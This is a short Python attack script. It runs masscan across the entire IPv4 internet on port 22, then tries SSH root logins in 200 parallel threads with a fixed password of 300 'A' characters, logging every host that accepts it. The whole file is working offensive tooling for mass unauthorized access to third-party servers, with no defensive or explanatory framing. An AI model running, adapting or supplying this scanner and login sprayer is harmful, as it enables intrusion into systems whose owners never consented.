#!/usr/bin/env python3
import subprocess
import paramiko
import re
from concurrent.futures import ThreadPoolExecutor

PASSWORD = "A" * 300
RESULTS_FILE = "success.txt"
SCAN_FILE = "scan_results.txt"
MAX_WORKERS = 200
IP_PATTERN = re.compile(r'\b(?:\d{1,3}\.){3}\d{1,3}\b')

def masscan():
    cmd = ["masscan", "0.0.0.0/0", "-p22", "--rate=100000", "--wait=130", "--exclude", "255.255.255.255", "-oL", SCAN_FILE]
    subprocess.run(cmd, check=True)

def try_login(ip):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(ip,
                       port=22,
                       username="root",
                       password=PASSWORD,
                       timeout=10,
                       allow_agent=False,
                       look_for_keys=False)
        with open(RESULTS_FILE, "a") as f:
            f.write(ip + "\n")
        print(f"[+] {ip} root login OK")
    except Exception:
        pass
    finally:
        client.close()

def main():
    #masscan()
    with open(SCAN_FILE) as f:
        content = f.read()
    
    ips = IP_PATTERN.findall(content)
    
    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as pool:
        list(pool.map(try_login, ips))

if __name__ == "__main__":
    main()

